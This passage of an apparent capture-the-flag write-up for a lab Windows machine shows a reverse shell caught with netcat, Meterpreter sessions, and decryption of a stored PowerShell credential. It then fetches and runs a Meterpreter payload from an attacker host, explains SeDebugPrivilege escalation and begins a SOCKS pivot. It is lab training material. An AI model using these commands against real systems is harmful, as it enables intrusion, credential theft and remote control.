+&lt;h2&gt;Object moved to &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/default.aspx?aspxerrorpath=/portfolio/default.aspx"</span><span class="o">&gt;</span>here&lt;/a&gt;.&lt;/h2&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+
+<p>Now look back into your listener :)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.14.219] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.44.96] 49671
+<span class="nb">whoami
+</span>pov<span class="se">\s</span>fitz
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
+</code></pre></div></div>
+
+<p>To not lose the connection (reverse shells are not stable), it is recommended to use a C2 like Metasploit or Silver:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.219:9901
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>248902 bytes<span class="o">)</span> to 10.129.44.96
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 2 opened <span class="o">(</span>10.10.14.219:9901 -&gt; 10.129.44.96:49675<span class="o">)</span> at 2026-05-12 19:43:30 +0200
+
+meterpreter <span class="o">&gt;</span> sysinfo
+Computer        : POV
+OS              : Windows Server 2019 <span class="o">(</span>10.0 Build 17763<span class="o">)</span><span class="nb">.</span>
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-31-privilege-escalation-sfitz---alaading">📈 3.1 Privilege Escalation (<code class="language-plaintext highlighter-rouge">sfitz</code> -&gt; <code class="language-plaintext highlighter-rouge">alaading</code>)</h2>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
+</span><span class="n">ls</span><span class="w">
+
+
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\sfitz</span><span class="w">
+
+
+</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">3D</span><span class="w"> </span><span class="nx">Objects</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Contacts</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">5/12/2026</span><span class="w">  </span><span class="nx">10:49</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Desktop</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">12/25/2023</span><span class="w">   </span><span class="nx">2:35</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Documents</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Downloads</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Favorites</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Links</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Music</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Pictures</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Saved</span><span class="w"> </span><span class="nx">Games</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Searches</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">10/26/2023</span><span class="w">   </span><span class="nx">5:02</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Videos</span><span class="w">
+
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="nx">Documents</span><span class="w">
+</span><span class="n">ls</span><span class="w"> </span><span class="nx">Documents</span><span class="w">
+
+
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\sfitz\Documents</span><span class="w">
+
+
+</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">12</span><span class="n">/25/2023</span><span class="w">   </span><span class="nx">2:26</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">1838</span><span class="w"> </span><span class="nx">connection.xml</span><span class="w">
+
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">Documents</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">Documents</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">connection.xml</span><span class="w">
+</span><span class="n">cat</span><span class="w"> </span><span class="nx">connection.xml</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">Objs</span><span class="w"> </span><span class="nx">Version</span><span class="o">=</span><span class="s2">"1.1.0.1"</span><span class="w"> </span><span class="n">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="err">&gt;</span><span class="w">
+  </span><span class="err">&lt;</span><span class="n">Obj</span><span class="w"> </span><span class="nx">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">TN</span><span class="w"> </span><span class="nx">RefId</span><span class="o">=</span><span class="s2">"0"</span><span class="err">&gt;</span><span class="w">
+      </span><span class="err">&lt;</span><span class="n">T</span><span class="err">&gt;</span><span class="nx">System.Management.Automation.PSCredential</span><span class="err">&lt;</span><span class="nx">/T</span><span class="err">&gt;</span><span class="w">
+      </span><span class="err">&lt;</span><span class="n">T</span><span class="err">&gt;</span><span class="nx">System.Object</span><span class="err">&lt;</span><span class="nx">/T</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">/TN</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">ToString</span><span class="err">&gt;</span><span class="nx">System.Management.Automation.PSCredential</span><span class="err">&lt;</span><span class="nx">/ToString</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">Props</span><span class="err">&gt;</span><span class="w">
+      </span><span class="err">&lt;</span><span class="n">S</span><span class="w"> </span><span class="nx">N</span><span class="o">=</span><span class="s2">"UserName"</span><span class="err">&gt;</span><span class="n">alaading</span><span class="err">&lt;</span><span class="nx">/S</span><span class="err">&gt;</span><span class="w">
+      </span><span class="err">&lt;</span><span class="n">SS</span><span class="w"> </span><span class="nx">N</span><span class="o">=</span><span class="s2">"Password"</span><span class="err">&gt;</span><span class="mi">01000000</span><span class="n">d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</span><span class="err">&lt;</span><span class="nx">/SS</span><span class="err">&gt;</span><span class="w">
+    </span><span class="err">&lt;</span><span class="n">/Props</span><span class="err">&gt;</span><span class="w">
+  </span><span class="err">&lt;</span><span class="n">/Obj</span><span class="err">&gt;</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">/Objs</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We can see an encrypted password for the user <code class="language-plaintext highlighter-rouge">alaading</code>. We can easily decrypt it in powershell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$encryptedPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Import-Clixml</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\Users\sfitz\Documents\connection.xml'</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$decryptedPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$encryptedPassword</span><span class="o">.</span><span class="nf">GetNetworkCredential</span><span class="p">()</span><span class="o">.</span><span class="nf">Password</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$decryptedPassword</span><span class="w">
+</span><span class="n">f8gQ8fynP44ek1m3</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Here it is: <code class="language-plaintext highlighter-rouge">f8gQ8fynP44ek1m3</code></p>
+
+<p>Now we can execute commands as <code class="language-plaintext highlighter-rouge">alaading</code> and get a meterpreter session as him:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$securePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"f8gQ8fynP44ek1m3"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PsCredential</span><span class="p">(</span><span class="s2">"pov\alaading"</span><span class="p">,</span><span class="w"> </span><span class="nv">$securePassword</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">pov</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="p">}</span><span class="w">
+</span><span class="nv">$securePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"f8gQ8fynP44ek1m3"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PsCredential</span><span class="p">(</span><span class="s2">"pov\alaading"</span><span class="p">,</span><span class="w"> </span><span class="nv">$securePassword</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">pov</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="p">}</span><span class="w">
+
+</span><span class="n">USER</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------</span><span class="w">
+
+</span><span class="n">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">    </span><span class="nx">SID</span><span class="w">
+</span><span class="o">============</span><span class="w"> </span><span class="o">=============================================</span><span class="w">
+</span><span class="n">pov\alaading</span><span class="w"> </span><span class="nx">S-1-5-21-2506154456-4081221362-271687478-1001</span><span class="w">
+
+
+</span><span class="n">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">-----------------</span><span class="w">
+
+</span><span class="n">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                             </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">          </span><span class="nx">Attributes</span><span class="w">
+</span><span class="o">======================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
+</span><span class="n">Everyone</span><span class="w">                               </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Remote</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="nx">Users</span><span class="w">        </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-580</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Users</span><span class="w">                          </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NETWORK</span><span class="w">                   </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-2</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">         </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Local</span><span class="w"> </span><span class="nx">account</span><span class="w">             </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-113</span><span class="w">    </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">  </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">Mandatory</span><span class="w"> </span><span class="nx">Label\Medium</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w"> </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-8192</span><span class="w">
+
+
+</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------------</span><span class="w">
+
+</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
+</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">========</span><span class="w">
+</span><span class="n">SeDebugPrivilege</span><span class="w">              </span><span class="nx">Debug</span><span class="w"> </span><span class="nx">programs</span><span class="w">                 </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">YOUR</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">YOUR</span><span class="w"> </span><span class="nx">SERVER</span><span class="w"> </span><span class="nx">PORT</span><span class="err">&gt;</span><span class="nx">/meterpreter.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">C:\Windows\Temp\m.exe</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s1">'icacls "C:\Windows\Temp\m.exe" /grant Everyone:(RX)'</span><span class="w">
+</span><span class="n">cmd.exe</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s1">'icacls "C:\Windows\Temp\m.exe" /grant Everyone:(RX)'</span><span class="w">
+</span><span class="n">processed</span><span class="w"> </span><span class="nx">file:</span><span class="w"> </span><span class="nx">C:\Windows\Temp\m.exe</span><span class="w">
+</span><span class="n">Successfully</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">files</span><span class="p">;</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="nx">processing</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">files</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\sfitz\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$securePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"f8gQ8fynP44ek1m3"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PsCredential</span><span class="p">(</span><span class="s2">"pov\alaading"</span><span class="p">,</span><span class="w"> </span><span class="nv">$securePassword</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">pov</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">C:\Windows\Temp\m.exe</span><span class="p">}</span><span class="w">
+</span><span class="nv">$securePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"f8gQ8fynP44ek1m3"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PsCredential</span><span class="p">(</span><span class="s2">"pov\alaading"</span><span class="p">,</span><span class="w"> </span><span class="nv">$securePassword</span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-computername</span><span class="w"> </span><span class="nx">pov</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$credential</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">C:\Windows\Temp\m.exe</span><span class="p">}</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="nx">stage</span><span class="w"> </span><span class="p">(</span><span class="mi">248902</span><span class="w"> </span><span class="n">bytes</span><span class="p">)</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">10.129.44.96</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Meterpreter</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="nx">3</span><span class="w"> </span><span class="nx">opened</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">14</span><span class="o">.</span><span class="nf">219</span><span class="p">:</span><span class="mi">9901</span><span class="w"> </span><span class="o">-</span><span class="err">&gt;</span><span class="w"> </span><span class="mf">10.129</span><span class="o">.</span><span class="nf">44</span><span class="o">.</span><span class="nf">96</span><span class="p">:</span><span class="mi">49716</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="nx">2026-05-12</span><span class="w"> </span><span class="nx">20:01:17</span><span class="w"> </span><span class="o">+</span><span class="nx">0200</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(multi/handler) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information         Connection
+  --  ----  ----                     -----------         ----------
+  2         meterpreter x64/windows  POV\sfitz @ POV     10.10.14.219:9901 -&gt; 10.129.44.96:49675 (10.129.44.96)
+  3         meterpreter x64/windows  POV\alaading @ POV  10.10.14.219:9901 -&gt; 10.129.44.96:49716 (10.129.44.96)
+</code></pre></div></div>
+
+<p>Here we go! You can find the user flag in <code class="language-plaintext highlighter-rouge">C:\Users\alaading\Desktop\user.txt</code>.</p>
+
+<hr />
+
+<h2 id="-32-privilege-escalation-alaading---administrator">📈 3.2 Privilege Escalation (<code class="language-plaintext highlighter-rouge">alaading</code> -&gt; <code class="language-plaintext highlighter-rouge">Administrator</code>)</h2>
+
+<p>After gaining access as alaading, we examine our privileges (<code class="language-plaintext highlighter-rouge">whoami /priv</code>):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre></div></div>
+
+<h4 id="-understanding-sedebugprivilege">🧠 Understanding <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code></h4>
+<p>The <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> is one of the most powerful rights in Windows. Originally designed for developers, it allows a process to “debug” any other process on the system. Technically, this means we can open a handle to a privileged process (even those running as <code class="language-plaintext highlighter-rouge">SYSTEM</code>) with full access rights (<code class="language-plaintext highlighter-rouge">PROCESS_ALL_ACCESS</code>). This allows us to read memory, inject code, or - as in this case - steal the security token of a higher-privileged process.</p>
+
+<h4 id="-the-wall-integrity-levels--uac">🧱 The Wall: Integrity Levels &amp; UAC</h4>
+<p>Even though we see the privilege in the list, it is set to Disabled. In our initial Meterpreter shell or a standard Invoke-Command, this privilege usually cannot be activated. This is due to Windows Integrity Levels:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Medium Integrity</code>: Standard users and “filtered” administrator shells run here. Even if a user has admin rights, Windows (via UAC) filters the token to “Disabled” for critical privileges like SeDebug to prevent accidental system compromise.</p>
+
+<p><code class="language-plaintext highlighter-rouge">High Integrity</code>: This is the “Elevated” context. Windows only allows a process to flip the state of powerful privileges from Disabled to Enabled within a High Integrity context.</p>
+
+<p>The Pivot: Since <code class="language-plaintext highlighter-rouge">alaading</code> is a member of the <code class="language-plaintext highlighter-rouge">Remote Management Users</code> group, we can log in via WinRM. WinRM sessions for administrative users start in a <code class="language-plaintext highlighter-rouge">High Integrity</code> Level by default, effectively bypassing the UAC filtering.</p>
+
+<h3 id="-step-321-pivoting-via-socks-proxy">🚇 Step 3.2.1: Pivoting via SOCKS Proxy</h3>
+<p>Since we are moving laterally within the network, we need a SOCKS proxy.</p>
+
+<h4 id="option-a-metasploit-socks">Option A: Metasploit SOCKS</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 10.129.44.0/16
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 10.129.44.0/255.255.0.0...
+[+] Added route to 10.129.44.0/255.255.0.0 via 10.129.44.96
+[*] Use the -p option to list all active routes
+meterpreter &gt; bg
+[*] Backgrounding session 3...
+msf auxiliary(server/socks_proxy) &gt; search server/socks
+
+Matching Modules
+================
+
+   #  Name                          Disclosure Date  Rank    Check  Description
+   -  ----                          ---------------  ----    -----  -----------
+   0  auxiliary/server/socks_proxy  .                normal  No     SOCKS Proxy Server
+   1  auxiliary/server/socks_unc    .                normal  No     SOCKS Proxy UNC Path Redirection
+
+
